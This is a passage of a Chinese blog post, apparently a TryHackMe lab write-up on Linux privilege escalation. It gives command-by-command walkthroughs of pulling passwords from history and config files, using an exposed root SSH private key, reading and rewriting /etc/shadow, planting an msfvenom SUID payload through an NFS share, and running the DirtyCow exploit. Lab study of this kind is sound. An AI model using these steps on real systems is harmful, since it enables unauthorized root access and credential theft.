+<h2 id="密码、秘钥"><a href="#密码、秘钥" class="headerlink" title="密码、秘钥"></a>密码、秘钥</h2><h3 id="历史文件"><a href="#历史文件" class="headerlink" title="历史文件"></a>历史文件</h3><p>如果用户不小心在命令行而不是在密码提示中输入密码，则可能会记录在历史文件中。</p>
+<pre><code>cat ~/.*history    //查看user home下所有隐藏历史文件的内容
+</code></pre>
+<pre><code>user@debian:~$ cat ~/.*history
+ls -al
+cat .bash_history 
+ls -al
+mysql -h somehost.local -uroot -ppassword123  //暴露出mysql密码
+exit
+cd /tmp
+clear
+ifconfig
+netstat -antp
+nano myvpn.ovpn 
+</code></pre>
+<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>配置文件通常包含明文或其他可逆格式的密码。</p>
+<pre><code class="shell">user@debian:~$ ls /home/user
+myvpn.ovpn  service  tools
+user@debian:~$ 
+user@debian:~$ cat /home/user/myvpn.ovpn   //注意 myvpn.ovpn 配置文件的存在。查看文件内容
+client
+dev tun
+proto udp
+remote 10.10.10.10 1194
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+ca ca.crt
+tls-client
+remote-cert-tls server 
+auth-user-pass /etc/openvpn/auth.txt         //该文件应包含另一个文件的引用
+comp-lzo
+verb 1
+reneg-sec 0
+
+
+user@debian:~$ cat /etc/openvpn/auth.txt      //查看该文件
+root
+password123
+user@debian:~$ su root                        //凭借密码登录到root
+Password: 
+root@debian:/home/user# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<h3 id="SSH秘钥"><a href="#SSH秘钥" class="headerlink" title="SSH秘钥"></a>SSH秘钥</h3><p>有时用户会备份重要文件，但无法使用正确的权限来保护它们。</p>
+<pre><code>user@debian:~$ ls -la /                                      //在系统根目录中查找隐藏的文件和目录
+total 96
+drwxr-xr-x 22 root root  4096 Aug 25  2019 .
+drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
+drwxr-xr-x  2 root root  4096 Aug 25  2019 bin
+drwxr-xr-x  3 root root  4096 May 12  2017 boot
+drwxr-xr-x 12 root root  2820 Feb 25 08:27 dev
+drwxr-xr-x 67 root root  4096 Feb 25 09:19 etc
+drwxr-xr-x  3 root root  4096 May 15  2017 home
+lrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -&gt; boot/initrd.img-2.6.32-5-amd64
+drwxr-xr-x 12 root root 12288 May 14  2017 lib
+lrwxrwxrwx  1 root root     4 May 12  2017 lib64 -&gt; /lib
+drwx------  2 root root 16384 May 12  2017 lost+found
+drwxr-xr-x  3 root root  4096 May 12  2017 media
+drwxr-xr-x  2 root root  4096 Jun 11  2014 mnt
+drwxr-xr-x  2 root root  4096 May 12  2017 opt
+dr-xr-xr-x 96 root root     0 Feb 25 08:25 proc
+drwx------  5 root root  4096 May 15  2020 root
+drwxr-xr-x  2 root root  4096 May 13  2017 sbin
+drwxr-xr-x  2 root root  4096 Jul 21  2010 selinux
+drwxr-xr-x  2 root root  4096 May 12  2017 srv
+drwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh
+drwxr-xr-x 13 root root     0 Feb 25 08:25 sys
+drwxrwxrwt  2 root root  4096 Feb 25 09:25 tmp
+drwxr-xr-x 11 root root  4096 May 13  2017 usr
+drwxr-xr-x 14 root root  4096 May 13  2017 var
+lrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -&gt; boot/vmlinuz-2.6.32-5-amd64
+user@debian:~$ ls -l /.ssh                                 //查看.ssh
+total 4
+-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key
+user@debian:~$ cat /.ssh/root_key                          //进一步查看，确定为ssh登录私钥
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
+gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
+p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
+OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
+eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
+Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
+NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
+YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
+5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
+WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
+VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
+6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
+1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
+824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
+Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
+U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
+Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
+SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
+d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
+jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
+871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
+X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
+CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
+Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
+LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p>将私钥复制，放入本地主机，利用私钥登录ssh root账户</p>
+<pre><code class="shell">┌──(n3ym4r㉿kali)-[~]
+└─$ ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.183.54
+//这里因为靶机太老，需要做些额外的设置
+</code></pre>
+<h2 id="弱文件"><a href="#弱文件" class="headerlink" title="弱文件"></a>弱文件</h2><h3 id="可读-x2F-etc-x2F-shadow"><a href="#可读-x2F-etc-x2F-shadow" class="headerlink" title="可读&#x2F;etc&#x2F;shadow"></a>可读&#x2F;etc&#x2F;shadow</h3><p>&#x2F;etc&#x2F;shadow 文件包含用户的密码哈希值，通常只有 root 用户可读，如果普通用户也能对etc&#x2F;shadow 文件进行读取，那么我们就能利用可读的&#x2F;etc&#x2F;shadow提权。</p>
+<pre><code>user@debian:~$ ls -l /etc/shadow                     //查看权限
+-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
+user@debian:~$ cat /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::
+lp:*:17298:0:99999:7:::
+mail:*:17298:0:99999:7:::
+news:*:17298:0:99999:7:::
+uucp:*:17298:0:99999:7:::
+proxy:*:17298:0:99999:7:::
+www-data:*:17298:0:99999:7:::
+backup:*:17298:0:99999:7:::
+list:*:17298:0:99999:7:::
+irc:*:17298:0:99999:7:::
+gnats:*:17298:0:99999:7:::
+nobody:*:17298:0:99999:7:::
+libuuid:!:17298:0:99999:7:::
+Debian-exim:!:17298:0:99999:7:::
+sshd:*:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+statd:*:17299:0:99999:7:::
+mysql:!:18133:0:99999:7:::
+user@debian:~$ 
+</code></pre>
+<p>在每行的第二个参数就是保存的密码hash(如果有的话)</p>
+<p>得到hash后，使用本地kali的john进行密码枚举，得到明文密码</p>
+<h3 id="可写-x2F-etc-x2F-shadow"><a href="#可写-x2F-etc-x2F-shadow" class="headerlink" title="可写&#x2F;etc&#x2F;shadow"></a>可写&#x2F;etc&#x2F;shadow</h3><pre><code>user@debian:~$ mkpasswd -m sha-512 1234       //生成1234的hash值
+$6$BWe0nZwWFr$Ek7Oxb/HmddxaOLZKAqi0PB9b/uJ3aDF/4SlmUQ07uT/HXT2yfyP7mtOZsJzgLR/jttTD/Fwv18sOzrKE2z6K1
+</code></pre>
+<p>然后，编辑&#x2F;etc&#x2F;shadow文件，将生成的hash替换root的密码。之后，使用root登录即可。</p>
+<h3 id="可写-x2F-etc-x2F-passwd"><a href="#可写-x2F-etc-x2F-passwd" class="headerlink" title="可写&#x2F;etc&#x2F;passwd"></a>可写&#x2F;etc&#x2F;passwd</h3><p>&#x2F;etc&#x2F;passwd 文件包含有关用户帐户的信息。它是全局可读的，但通常只能由 root 用户写入。从历史上看，&#x2F;etc&#x2F;passwd 文件包含用户密码哈希值，某些版本的 Linux 仍然允许将密码哈希值存储在那里。</p>
+<p>和前面etc&#x2F;shadow一个道理，生成hash进入文件替换，登录即可。</p>
+<h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h2><p>网络文件系统（NFS）是一个客户端&#x2F;服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。</p>
+<p>通过 NFS 创建的文件继承远程用户的 ID。如果用户是 root，并且启用了 root_sqaush 压缩，则 ID 将改为设置为“nobody”用户。如果没有启用，则具有root访问权限。</p>
+<p>Root Squashing（<em>root_sqaush</em>）参数阻止对连接到NFS卷的远程root用户具有root访问权限。</p>
+<p>也就是说，利用此漏洞，必须为no_root_squash</p>
+<pre><code>user@debian:~$ cat /etc/exports                       //查看nfs共享设置
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)    ///tmp目录是可共享的，远程用户可以挂载它，并且/tmp目录共享还禁用了root_squash选项（启用no_root_squash选项-----即代表禁用了root_squash）
+#/tmp *(rw,sync,insecure,no_subtree_check)
+</code></pre>
+<p>此时回到我们的本地kali</p>
+<pre><code class="shell">┌──(n3ym4r㉿kali)-[~]
+└─$ su root                               //切换到root                                                          
+密码： 
+┌──(root㉿kali)-[/home/n3ym4r]
+└─# mkdir /tmp/nfs                        //创建目录
+                                                                                                                
+                                                                                                                
+┌──(root㉿kali)-[/home/n3ym4r]
+└─# mount -o rw,vers=3 10.10.183.54:/tmp /tmp/nfs          //创建一个挂载点并挂载目标机的/tmp 共享目录
+
+
+                                                                                                                
+┌──(root㉿kali)-[/home/n3ym4r]
+└─# msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf  
+
+//msf生成一个payload并将其保存到刚才挂载的共享目录（这个payload的作用是调用/bin/bash）
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 48 bytes
+Final size of elf file: 132 bytes
+Saved as: /tmp/nfs/shell.elf
+                                                                                                                
+┌──(root㉿kali)-[/home/n3ym4r]
+└─# chmod +xs /tmp/nfs/shell.elf                //使payload文件可执行并设置 SUID 权限
+</code></pre>
+<p>切到目标机普通用户，执行payload文件</p>
+<pre><code class="shell">user@debian:~$ /tmp/shell.elf 
+bash-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+</code></pre>
+<p>得到root</p>
+<h2 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h2><p>运行 Linux Exploit Suggester 2 工具来识别当前系统上潜在的内核漏洞</p>
+<pre><code class="shell">user@debian:~$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+
+  #############################
+    Linux Exploit Suggester 2
+  #############################
+
+  Local Kernel: 2.6.32
+  Searching 72 exploits...
+
+  Possible Exploits
+  [1] american-sign-language
+      CVE-2010-4347
+      Source: http://www.securityfocus.com/bid/45408
+  [2] can_bcm
+      CVE-2010-2959
+      Source: http://www.exploit-db.com/exploits/14814
+  [3] dirty_cow
+      CVE-2016-5195
+      Source: http://www.exploit-db.com/exploits/40616
+  [4] exploit_x
+      CVE-2018-14665
+      Source: http://www.exploit-db.com/exploits/45697
+  [5] half_nelson1
+      Alt: econet       CVE-2010-3848
+      Source: http://www.exploit-db.com/exploits/17787
+  [6] half_nelson2
+      Alt: econet       CVE-2010-3850
+      Source: http://www.exploit-db.com/exploits/17787
+  [7] half_nelson3
+      Alt: econet       CVE-2010-4073
+      Source: http://www.exploit-db.com/exploits/17787
+  [8] msr
+      CVE-2013-0268
+      Source: http://www.exploit-db.com/exploits/27297
+  [9] pktcdvd
+      CVE-2010-3437
+      Source: http://www.exploit-db.com/exploits/15150
+  [10] ptrace_kmod2
+      Alt: ia32syscall,robert_you_suck       CVE-2010-3301
+      Source: http://www.exploit-db.com/exploits/15023
+  [11] rawmodePTY
+      CVE-2014-0196
+      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
+  [12] rds
+      CVE-2010-3904
+      Source: http://www.exploit-db.com/exploits/15285
+  [13] reiserfs
+      CVE-2010-1146
+      Source: http://www.exploit-db.com/exploits/12130
+  [14] video4linux
+      CVE-2010-3081
+      Source: http://www.exploit-db.com/exploits/15024
+</code></pre>
+<p>查看输出第三条著名漏洞——<strong>脏牛</strong></p>
+<p>利用exp</p>
+<p>执行exp会将SUID文件&#x2F;<code>usr/bin/passwd</code>替换为 生成shell的文件（从外在看不出变化）</p>
+<pre><code class="shell">user@debian:~$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w     //编译exp
+user@debian:~$ ./c0w                                                                  //执行
+                                
+   (___)                                   
+   (o o)_____/                             
+    @@ `     \                            
+     \ ____, //usr/bin/passwd                          
+     //    //                              
+    ^^    ^^                               
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd to /tmp/bak
+mmap 733f000
+
+madvise 0
+
+ptrace 0
+
+user@debian:~$ /usr/bin/passwd                                             //执行替换后的usr/bin/passwd
+root@debian:/home/user# 
+root@debian:/home/user# id                                               //得到root
+uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+</code></pre>
+<p>这里存在的其他漏洞就不做演示了，使用exp利用即可。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>  提权的方法很多，要视实际情况而定，这里介绍到的是最基础的提权方式。</p>
+<p>  一般流程为：</p>
+<p>1.通过各种命令进行简单信息收集</p>
+<p>2.利用检测脚本批量快速收集可能利用的提权点</p>
+<p>检测出漏洞直接利用</p>
+<p>3.查看各种服务、配置文件、历史文件看有没有暴露的密码</p>
+<p>4.sudo&#x2F;suid&#x2F;cron提权</p>
+<p>5.查看各种服务、第三方应用的版本，看有无漏洞利用点，如MySQL的udf提权等</p>
+<p>7.内核exp</p>
+<blockquote>
+<p>参考链接：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://tryhackme.com/room/linuxprivesc#" >https://tryhackme.com/room/linuxprivesc#<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/carlospolop/hacktricks/blob/master/linux-hardening/privilege-escalation/README.md" >https://github.com/carlospolop/hacktricks/blob/master/linux-hardening/privilege-escalation/README.md<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid" >https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li>本文标题：linux提权</li>
+        <li>本文作者：n3ym4r</li>
+        <li>创建时间：2023-02-25 23:56:14</li>
+        <li>
+            本文链接：https://n3ym4r.github.io/2023/02/25/linux提权/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/linux/">#linux</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%8F%90%E6%9D%83/">#提权</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/02/12/HTB-easy%20Machines%E7%B3%BB%E5%88%97/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">HTB-easy Machines系列</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">n3ym4r</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题
+            &nbsp;
+            <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.9</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-up-right-and-down-left-from-center"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC"><span class="nav-text">提权检测脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="nav-text">sudo提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="nav-text">命令提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-text">环境变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cron%E4%BD%9C%E4%B8%9A"><span class="nav-text">Cron作业</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90"><span class="nav-text">文件权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PATH-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-text">PATH 环境变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="nav-text">通配符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUID"><span class="nav-text">SUID</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">已知漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5"><span class="nav-text">共享对象注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-1"><span class="nav-text">环境变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BB%A5%E7%94%A8shell"><span class="nav-text">滥用shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bash-lt-4-2-048"><span class="nav-text">bash&lt;4.2-048</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bash-lt-4-4"><span class="nav-text">bash&lt;4.4</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E3%80%81%E7%A7%98%E9%92%A5"><span class="nav-text">密码、秘钥</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%86%E5%8F%B2%E6%96%87%E4%BB%B6"><span class="nav-text">历史文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-text">配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH%E7%A7%98%E9%92%A5"><span class="nav-text">SSH秘钥</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E6%96%87%E4%BB%B6"><span class="nav-text">弱文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%AF%BB-x2F-etc-x2F-shadow"><span class="nav-text">可读&#x2F;etc&#x2F;shadow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E5%86%99-x2F-etc-x2F-shadow"><span class="nav-text">可写&#x2F;etc&#x2F;shadow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E5%86%99-x2F-etc-x2F-passwd"><span class="nav-text">可写&#x2F;etc&#x2F;passwd</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NFS"><span class="nav-text">NFS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="nav-text">内核漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/code-block-tools.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/toc.js"></script>
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
